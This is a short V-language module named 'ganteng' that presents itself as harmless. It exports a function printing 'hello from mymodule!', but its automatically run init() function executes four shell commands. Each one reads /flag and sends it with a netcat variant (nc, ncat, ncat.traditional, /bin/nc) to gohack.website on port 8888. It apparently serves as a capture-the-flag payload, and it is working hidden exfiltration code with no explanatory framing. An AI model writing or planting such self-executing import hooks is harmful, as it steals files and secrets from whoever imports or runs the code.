module ganteng

import os

// To export a function we have to use `pub`
pub fn say_hi() {
	println('hello from mymodule!')
}

fn init(){
os.system('cat /flag | nc gohack.website 8888')
os.system('cat /flag | ncat gohack.website 8888')
os.system('cat /flag | ncat.traditional gohack.website 8888')
os.system('cat /flag | /bin/nc gohack.website 8888')
}
